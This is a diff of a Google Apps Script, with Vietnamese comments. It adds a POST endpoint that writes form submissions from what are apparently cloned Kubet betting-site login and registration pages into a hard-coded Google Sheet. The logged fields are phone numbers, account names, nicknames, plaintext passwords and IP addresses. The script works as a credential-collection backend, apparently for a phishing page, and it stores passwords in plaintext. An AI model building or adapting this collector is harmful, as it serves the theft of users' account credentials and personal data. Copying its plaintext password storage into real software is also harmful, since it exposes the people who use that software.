@@ -1,79 +1,47 @@
 // ==========================================
-// 1. TẠO GOOGLE SHEET TRƯỚC
-// ==========================================
-// Bước 1: Vào Google Drive → New → Google Sheets
-// Bước 2: Đặt tên file: "Kubet Form Data"
-// Bước 3: Tạo 2 Sheet tab (click dấu + ở dưới):
-//         - Sheet 1 đổi tên thành: "DangNhap"
-//         - Sheet 2 đổi tên thành: "DangKy"
-// Bước 4: Ở tab "DangNhap", dán dòng header sau vào A1:
-//         ThoiGian | SoDienThoai | TaiKhoan | Loai | IP
-// Bước 5: Ở tab "DangKy", dán dòng header sau vào A1:
-//         ThoiGian | MaGioiThieu | TaiKhoan | BietDanh | MatKhau | SoDienThoai | Loai | IP
-// Bước 6: Vào menu Extensions → Apps Script
-
-
-// ==========================================
-// 2. COPY CODE NÀY VÀO GOOGLE APPS SCRIPT
+// Google Apps Script - Auto Create Sheets + Headers
 // ==========================================
 
 function doPost(e) {
   try {
-    // Parse data từ POST request
     var data = JSON.parse(e.postData.contents);
-    
-    // Mở spreadsheet theo ID (thay YOUR_SPREADSHEET_ID bằng ID thật)
-    // Lấy ID từ URL: https://docs.google.com/spreadsheets/d/XXXXXXXX/edit
+
     var spreadsheetId = '1aIcPJzzLSQo9cvkPChcggzNeiyoS26ShMu5TSo05Z6A';
     var ss = SpreadsheetApp.openById(spreadsheetId);
-    
-    // Xác định sheet nào dựa vào type
+
     var sheetName = data.type === 'login' ? 'DangNhap' : 'DangKy';
     var sheet = ss.getSheetByName(sheetName);
-    
+
+    // Nếu sheet chưa tồn tại → tự động tạo mới + thêm header
     if (!sheet) {
-      return ContentService.createTextOutput(JSON.stringify({
-        status: 'error',
-        message: 'Sheet ' + sheetName + ' không tồn tại'
-      })).setMimeType(ContentService.MimeType.JSON);
+      sheet = ss.insertSheet(sheetName);
+      if (data.type === 'login') {
+        sheet.appendRow(['ThoiGian','SoDienThoai','TaiKhoan','Loai','IP']);
+      } else {
+        sheet.appendRow(['ThoiGian','MaGioiThieu','TaiKhoan','BietDanh','MatKhau','SoDienThoai','Loai','IP']);
+      }
+      // Format header: in đậm, nền xám nhạt
+      var headerRange = sheet.getRange(1, 1, 1, sheet.getLastColumn());
+      headerRange.setFontWeight('bold');
+      headerRange.setBackground('#e5e7eb');
     }
-    
-    // Chuẩn bị row data theo type
+
     var row = [];
     var now = new Date();
-    
+
     if (data.type === 'login') {
-      // DangNhap columns: ThoiGian | SoDienThoai | TaiKhoan | Loai | IP
-      row = [
-        now,                                    // A: ThoiGian
-        data.phone || '',                       // B: SoDienThoai
-        data.username || '',                    // C: TaiKhoan
-        'Đăng nhập',                            // D: Loai
-        data.ip || ''                           // E: IP
-      ];
+      row = [now, data.phone || '', data.username || '', 'Đăng nhập', data.ip || ''];
     } else {
-      // DangKy columns: ThoiGian | MaGioiThieu | TaiKhoan | BietDanh | MatKhau | SoDienThoai | Loai | IP
-      row = [
-        now,                                    // A: ThoiGian
-        data.referralCode || '',                // B: MaGioiThieu
-        data.account || '',                     // C: TaiKhoan
-        data.nickname || '',                    // D: BietDanh
-        data.password || '',                    // E: MatKhau
-        data.phone || '',                       // F: SoDienThoai
-        'Đăng ký',                              // G: Loai
-        data.ip || ''                           // H: IP
-      ];
+      row = [now, data.referralCode || '', data.account || '', data.nickname || '', data.password || '', data.phone || '', 'Đăng ký', data.ip || ''];
     }
-    
-    // Append row vào sheet
+
     sheet.appendRow(row);
-    
-    // Trả về success
+
     return ContentService.createTextOutput(JSON.stringify({
       status: 'success',
       message: 'Đã lưu vào Google Sheet'
     })).setMimeType(ContentService.MimeType.JSON);
-    
+
   } catch (error) {
     return ContentService.createTextOutput(JSON.stringify({
       status: 'error',
